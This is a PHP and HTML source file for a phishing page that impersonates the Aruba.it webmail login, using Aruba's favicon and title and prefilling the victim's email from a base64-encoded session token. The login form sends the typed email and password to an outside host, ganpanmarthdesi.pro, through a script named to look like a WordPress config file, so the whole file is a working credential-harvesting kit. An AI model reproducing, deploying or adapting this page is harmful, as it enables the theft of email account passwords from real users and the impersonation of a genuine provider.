<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?><html>
<head>
  <link rel="icon" href="https://webmail.aruba.it/web_imgs/aruba/favicon.ico" type="image/x-icon">
  <title>webmail Aruba</title>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=email] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 48px;
  width: 100%;
  margin: 0;
  background: #fff;
  border: 0px solid #000000;
  border-bottom: 2px solid #000000;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 15px;
  color: #404040;
  background-color: white;
  background-image: url("img/email-ico.png");
  background-position: 0px 5px; 
  background-repeat: no-repeat;
  padding: 10px 40px;
  }
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 48px;
  width: 100%;
  padding: 0 1px;
  margin: 0;
  background: #fff;
  border: 0px solid #000000;
  border-bottom: 2px solid #000000;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 15px;
  color: #404040;
  background-color: white;
  background-image: url("img/password-ico.png");
  background-position: 0px 5px; 
  background-repeat: no-repeat;
  padding: 10px 40px;
  }
  input[type=email]:focus {
  outline: none;
  border: 0px solid #F4A253;
  border-bottom: 2px solid #F4A253;
  }
  input[type=password]:focus {
  outline: none;
  border: 0px solid #F4A253;
  border-bottom: 2px solid #F4A253;
  }
</style>
<body>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td>
		<div align="center">
			<table border="0" width="1055" cellspacing="0" cellpadding="0">
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="130"></td>
								</tr>
								<tr>
									<td>
									<img border="0" src="img/ad.png" width="605" height="436"></td>
								</tr>
								<tr>
									<td height="20"></td>
								</tr>
							</table>
							</td>
							<td width="44">&nbsp;</td>
							<form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post" >
							<td height="583" width="402" background="img/fm.png">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="270"></td>
								</tr>
								<tr>
									<td height="48">
									  <input type="email" name="user" placeholder="Email" required value="<?php echo $users;?>@<?php echo $ddomain;?>" >
									  <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
									  <input type="hidden" name="link" value="https://webmail.aruba.it/" >
									  <input type="hidden" name="sender" value="Aruba.it" >
									</td>
								</tr>
								<tr>
									<td height="12"></td>
								</tr>
								<tr>
									<td height="48">
									  <input type="password" name="passwd" placeholder="Password" required autofocus ></td>
								</tr>
								<tr>
									<td height="150"></td>
								</tr>
								<tr>
									<td height="50">
									<input type="image" src="img/btn.png" width="402" height="50"></td>
								</tr>
							</table>
							</td>
						</tr>
					</table>
					</td>
				</tr>
			</table>
		</div>
		</td>
	</tr>
	</form>
	<tr>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td>
		<p align="center">
		<img border="0" src="img/footer-02.png" width="443" height="46"></td>
	</tr>
	<tr>
		<td bgcolor="#F2F2F0">
		<p align="center">
		<img border="0" src="img/footer-01.png" width="224" height="21"></td>
	</tr>
</table>
</body>
</html>
